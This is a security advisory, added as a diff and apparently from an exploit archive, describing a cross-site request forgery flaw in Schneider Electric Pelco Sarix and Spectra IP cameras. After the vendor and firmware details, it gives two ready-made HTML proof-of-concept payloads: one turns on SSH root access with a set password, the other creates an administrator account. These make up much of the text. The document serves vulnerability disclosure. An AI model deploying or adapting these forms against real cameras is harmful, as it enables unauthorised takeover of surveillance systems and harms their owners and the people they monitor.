@@ -1,0 +1,82 @@
+Schneider Electric Pelco Sarix/Spectra Cameras CSRF Enable SSH Root Access
+
+
+Vendor: Schneider Electric SE
+Product web page: https://www.pelco.com
+Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
+                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
+                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
+                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
+
+Summary: Pelco offers the broadest selection of IP cameras designed
+for security surveillance in a wide variety of commercial and industrial
+settings. From our industry-leading fixed and high-speed IP cameras to
+panoramic, thermal imaging, explosionproof and more, we offer a camera
+for any environment, any lighting condition and any application.
+When nothing but the best will do. Sarix™ Enhanced Range cameras
+provide the most robust feature-set for your mission-critical applications.
+With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
+in difficult lighting conditions such as a combination of bright areas,
+shaded areas, and intense light. Designed with superior reliability,
+fault tolerance, and processing speed, these rugged fixed IP cameras
+ensure you always get the video that you need.
+
+Desc: The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+
+Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
+           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
+           Lighttpd/1.4.28
+           PHP/5.3.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5416
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5416.php
+
+
+07.04.2017
+
+--
+
+
+CSRF enable ssh root access:
+----------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/network/ssh/update" method="POST">
+      <input type="hidden" name="enabled" value="1" />
+      <input type="hidden" name="password" value="root123" />
+      <input type="hidden" name="password&#95;confirmation" value="root123" />
+      <input type="submit" value="Go root" />
+    </form>
+  </body>
+</html>
+
+
+
+CSRF add admin:
+---------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/setup/auth/users/create" method="POST">
+      <input type="hidden" name="original&#95;username" value="" />
+      <input type="hidden" name="mode" value="create" />
+      <input type="hidden" name="group" value="admins" />
+      <input type="hidden" name="username" value="pelco_admin" />
+      <input type="hidden" name="password" value="pelco_pass" />
+      <input type="hidden" name="password&#95;confirmation" value="pelco_pass" />
+      <input type="submit" value="Add admin" />
+    </form>
+  </body>
+</html>
